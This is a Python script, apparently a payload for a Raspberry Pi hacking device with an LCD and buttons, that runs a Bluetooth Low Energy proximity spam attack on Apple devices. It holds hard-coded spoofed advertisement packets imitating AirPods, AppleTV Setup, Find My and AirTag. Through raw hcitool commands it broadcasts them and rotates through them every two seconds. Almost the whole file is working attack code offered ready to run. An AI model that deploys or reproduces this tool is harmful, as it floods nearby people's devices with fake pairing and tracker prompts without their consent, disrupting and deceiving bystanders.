#!/usr/bin/env python3
"""
KTOx *payload* – **BLE Proximity Spam**
==========================================
This payload performs a Bluetooth Low Energy (BLE) proximity spam attack,
specifically targeting Apple devices by spoofing various advertisements
like AirPods, AppleTV Setup, Find My, and AirTag. It uses `hcitool` for
raw HCI commands to broadcast these spoofed packets.

Features:
- Broadcasts selected spoofed BLE advertisements.
- Cycles through different spoofed payloads while active.
- Displays current status (ACTIVE/STOPPED) and current payload on the LCD.
- Start/Stop functionality via OK button.
- Payload selection via UP/DOWN buttons when stopped.
- Graceful exit via KEY3 or Ctrl-C, ensuring Bluetooth is cleaned up.

Controls:
- OK: Toggle attack (Start/Stop).
- UP/DOWN: Change selected payload (only when attack is STOPPED).
- KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

PAYLOADS = {
    "AirPods": "1e 02 01 06 1a ff 4c 00 07 19 01 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "AppleTV Setup": "1e 02 01 06 1a ff 4c 00 0d 0c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "Find My": "1e 02 01 06 1a ff 4c 00 12 19 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "AirTag": "1e 02 01 06 1a ff 4c 00 12 19 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
}
PAYLOAD_NAMES = list(PAYLOADS.keys())

running = True
attack_process = None # For hcitool cmd 0x000a

def run_bt_command(command_parts, error_message, display_error=True):
    try:
        result = subprocess.run(command_parts, shell=False, check=True, capture_output=True, text=True)
        if result.stderr:
            print(f"WARNING: {error_message} - STDERR: {result.stderr.strip()}", file=sys.stderr)
        return True
    except subprocess.CalledProcessError as e:
        print(f"ERROR: {error_message} - Command: {' '.join(command_parts)} - STDERR: {e.stderr.strip()}", file=sys.stderr)
        if display_error:
            draw_ui(status="ERROR", current_payload="", message_lines=[f"ERROR: {error_message}", f"{e.stderr.strip()[:20]}"])
            time.sleep(3)
        return False
    except FileNotFoundError:
        print(f"ERROR: {error_message} - Command not found: {command_parts[0]}", file=sys.stderr)
        if display_error:
            draw_ui(status="ERROR", current_payload="", message_lines=[f"ERROR: Command not found", f"{command_parts[0]}"])
            time.sleep(3)
        return False

def cleanup(*_):
    global running
    if running:
        running = False
        print("Cleaning up Bluetooth devices...", file=sys.stderr)
        draw_ui(status="CLEANING UP", current_payload="", message_lines=["Cleaning up BLE..."])
        stop_attack()
        run_bt_command(["bluetoothctl", "power", "off"], "Failed to power off Bluetooth", display_error=False)
        run_bt_command(["pkill", "-f", "bluetoothctl"], "Failed to kill bluetoothctl processes", display_error=False)
        run_bt_command(["pkill", "-f", "hcitool"], "Failed to kill hcitool processes", display_error=False)
        print("Bluetooth cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

HCI_INTERFACE = "hci0"

def start_attack(payload_name: str):
    global attack_process
    stop_attack()

    payload_data = PAYLOADS[payload_name]
    
    # Explicitly ensure Bluetooth adapter is ready
    if not run_bt_command(["rfkill", "unblock", "bluetooth"], "Failed to unblock Bluetooth"): return False
    if not run_bt_command(["bluetoothctl", "power", "on"], "Failed to power on Bluetooth"): return False
    if not run_bt_command(["hciconfig", HCI_INTERFACE, "up"], "Failed to bring up HCI interface"): return False

    # Set advertising data
    cmd_data = ["hcitool", "-i", HCI_INTERFACE, "cmd", "0x08", "0x0008"] + payload_data.split()
    if not run_bt_command(cmd_data, "Failed to set advertising data"): 
        return False
    
    # Enable advertising
    cmd_enable = ["hcitool", "-i", HCI_INTERFACE, "cmd", "0x08", "0x000a", "01"]
    attack_process = subprocess.Popen(cmd_enable, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    
    return True

def stop_attack():
    global attack_process
    if attack_process:
        attack_process.terminate()
        attack_process = None
    
    # Disable advertising
    cmd_disable = ["hcitool", "-i", HCI_INTERFACE, "cmd", "0x08", "0x000a", "00"]
    run_bt_command(cmd_disable, "Failed to disable advertising", display_error=False)

def draw_ui(status: str, current_payload: str, message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "BLE Proximity Spam", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    else:
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)

        d.text((5, 60), "Payload:", font=FONT, fill="white")
        d.text((15, 75), current_payload, font=FONT_TITLE, fill="yellow")

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

class Payload:
    def run(self):
        try:
            is_attacking = False
            current_payload_index = 0
            
            if not run_bt_command(["which", "hcitool"], "hcitool not found"):
                draw_ui(status="ERROR", current_payload="", message_lines=["hcitool not found!"])
                time.sleep(5)
                raise SystemExit("hcitool not found")
            if not run_bt_command(["which", "bluetoothctl"], "bluetoothctl not found"):
                draw_ui(status="ERROR", current_payload="", message_lines=["bluetoothctl not found!"])
                time.sleep(5)
                raise SystemExit("bluetoothctl not found")
            if not run_bt_command(["which", "hciconfig"], "hciconfig not found"):
                draw_ui(status="ERROR", current_payload="", message_lines=["hciconfig not found!"])
                time.sleep(5)
                raise SystemExit("hciconfig not found")

            draw_ui("STOPPED", PAYLOAD_NAMES[current_payload_index])

            last_button_press_time = 0
            BUTTON_DEBOUNCE_TIME = 0.3 # seconds

            while running:
                current_time = time.time()
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break

                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    is_attacking = not is_attacking
                    if is_attacking:
                        draw_ui(status="STARTING", current_payload=PAYLOAD_NAMES[current_payload_index], message_lines=["Starting attack..."])
                        if not start_attack(PAYLOAD_NAMES[current_payload_index]):
                            draw_ui(status="ERROR", current_payload="", message_lines=["Failed to start attack!"])
                            time.sleep(3)
                            is_attacking = False
                    else:
                        draw_ui(status="STOPPING", current_payload=PAYLOAD_NAMES[current_payload_index], message_lines=["Stopping attack..."])
                        stop_attack()
                    
                    draw_ui("ACTIVE" if is_attacking else "STOPPED", PAYLOAD_NAMES[current_payload_index])
                    time.sleep(BUTTON_DEBOUNCE_TIME) # Debounce after OK press

                if not is_attacking: # Only change payload when stopped
                    if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                        last_button_press_time = current_time
                        current_payload_index = (current_payload_index - 1) % len(PAYLOAD_NAMES)
                        draw_ui("STOPPED", PAYLOAD_NAMES[current_payload_index])
                        time.sleep(BUTTON_DEBOUNCE_TIME)
                    elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                        last_button_press_time = current_time
                        current_payload_index = (current_payload_index + 1) % len(PAYLOAD_NAMES)
                        draw_ui("STOPPED", PAYLOAD_NAMES[current_payload_index])
                        time.sleep(BUTTON_DEBOUNCE_TIME)

                if is_attacking:
                    # Cycle payload every 2 seconds while attacking
                    time.sleep(2) # Time for current payload to advertise
                    current_payload_index = (current_payload_index + 1) % len(PAYLOAD_NAMES)
                    if not start_attack(PAYLOAD_NAMES[current_payload_index]):
                        draw_ui(status="ERROR", current_payload="", message_lines=["Failed to cycle payload!"])
                        is_attacking = False # Stop attack on failure
                    draw_ui("ACTIVE", PAYLOAD_NAMES[current_payload_index])
                else:
                    time.sleep(0.1)

        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:
            print(f"[ERROR] {e}", file=sys.stderr)
            draw_ui(status="ERROR", current_payload="", message_lines=["An error occurred.", str(e)[:20]])
            time.sleep(3)
        finally:
            cleanup()
            LCD.LCD_Clear()
            GPIO.cleanup()
            print("BLE Spam payload finished.")

if __name__ == "__main__":
    payload = Payload()
    payload.run()

